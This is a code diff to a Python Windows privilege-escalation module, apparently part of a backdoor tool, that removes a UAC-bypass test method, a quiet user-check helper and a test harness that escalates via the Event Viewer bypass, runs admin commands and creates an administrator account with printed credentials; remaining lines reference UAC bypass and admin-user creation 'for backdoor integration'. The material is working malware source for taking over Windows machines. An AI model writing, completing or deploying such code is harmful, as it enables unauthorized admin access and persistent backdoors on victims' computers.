@@ -115,45 +115,6 @@ class Windows7PrivilegeEscalator:
         except:
             return False, username, password, "User verification error"
     
-    def escalate_privileges(self):
-        """Test privilege escalation"""
-        # Test basic UAC bypass
-        test_file = os.path.join(tempfile.gettempdir(), f"uac_test_{int(time.time())}.txt")
-        success, _ = self.execute_admin_command(f"echo UAC_SUCCESS > {test_file}")
-        
-        if success and os.path.exists(test_file):
-            try:
-                with open(test_file, 'r') as f:
-                    content = f.read()
-                os.remove(test_file)
-                if "UAC_SUCCESS" in content:
-                    return True, "Event Viewer UAC bypass is working - can execute admin commands"
-                else:
-                    return False, "UAC bypass test failed - file created but content invalid"
-            except:
-                return False, "UAC bypass test failed - file access error"
-        else:
-            return False, "UAC bypass test failed - no verification file created"
-    
-    def get_current_user(self):
-        """Get current user info - NO PRINTS"""
-        try:
-            username = os.environ.get('USERNAME', 'Unknown')
-            is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
-            
-            if is_admin:
-                return f"Administrator ({username})"
-            else:
-                return f"Standard User ({username})"
-        except:
-            return "Unknown"
-        
-    # Compatibility properties for backdoor integration
-    @property
-    def current_privileges(self):
-        """Check current privilege level for backdoor status"""
-        return self.get_current_user()
-
 # Standalone functions for backward compatibility
 def eventvwr_uac_bypass_confirmed(payload_command):
     """Standalone function for compatibility"""
@@ -174,35 +135,3 @@ def create_admin_user_detailed(username=None, password=None):
 # Create instance function for backdoor integration
 def create_windows7_privilege_escalator():
     return Windows7PrivilegeEscalator()
-
-# Test function for standalone testing
-if __name__ == "__main__":
-    escalator = Windows7PrivilegeEscalator()
-    
-    print("Windows 7 Privilege Escalation Test (Clean Version)")
-    print("=" * 50)
-    
-    # Test current user
-    current = escalator.get_current_user()
-    print(f"Current User: {current}")
-    
-    # Test escalation
-    success, message = escalator.escalate_privileges()
-    print(f"UAC Bypass: {'SUCCESS' if success else 'FAILED'}")
-    print(f"Message: {message}")
-    
-    if success:
-        # Test admin command
-        cmd_success, cmd_result = escalator.execute_admin_command("whoami")
-        print(f"Admin Command: {'SUCCESS' if cmd_success else 'FAILED'}")
-        print(f"Result: {cmd_result}")
-        
-        # Test admin user creation
-        user_success, username, password, user_message = escalator.create_admin_user()
-        print(f"Admin User: {'SUCCESS' if user_success else 'FAILED'}")
-        if user_success:
-            print(f"Username: {username}")
-            print(f"Password: {password}")
-        print(f"Message: {user_message}")
-    
-    print("\nAll functions available - ready for backdoor integration!")
